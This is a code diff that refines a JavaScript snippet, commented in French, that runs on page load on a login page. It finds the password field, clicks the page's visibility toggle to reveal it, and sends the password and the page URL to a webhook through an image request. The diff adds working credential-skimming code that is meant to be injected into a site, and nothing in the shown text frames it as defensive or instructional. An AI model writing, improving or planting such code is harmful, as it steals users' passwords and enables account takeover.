@@ -9,27 +9,23 @@
     i.src = `${webhook}?password=${encodeURIComponent(password)}&url=${encodeURIComponent(window.location.href)}`;
   }
 
-  function revealAndSteal() {
-    try {
-      const passwordInput = document.getElementById('password');
+  function revealPasswordAndExfil() {
+    const eyeSpy = document.querySelector('.eye-spy');
+    const passwordInput = document.getElementById('password');
 
-      if (!passwordInput) {
-        setTimeout(revealAndSteal, 500);
-        return;
-      }
+    if (!eyeSpy || !passwordInput) {
+      setTimeout(revealPasswordAndExfil, 500);
+      return;
+    }
 
-      // Simule le passage en "visible"
-      passwordInput.type = 'text';
+    // Simule un clic pour activer togglePasswordVisibility (utile si le comportement dépend de l'UI)
+    eyeSpy.click();
 
-      // Ou on pourrait appeler directement la fonction native si l'événement est dispo
-      // togglePasswordVisibility({ target: /*...*/ });
-
-      // Exfiltration directe
+    // Patiente un petit peu si nécessaire
+    setTimeout(() => {
       exfiltrate(passwordInput.value);
-    } catch (e) {}
+    }, 200); // délai léger pour s'assurer que le champ est bien passé en clair
   }
 
-  // Run immédiat
-  revealAndSteal();
-
+  revealPasswordAndExfil();
 })();
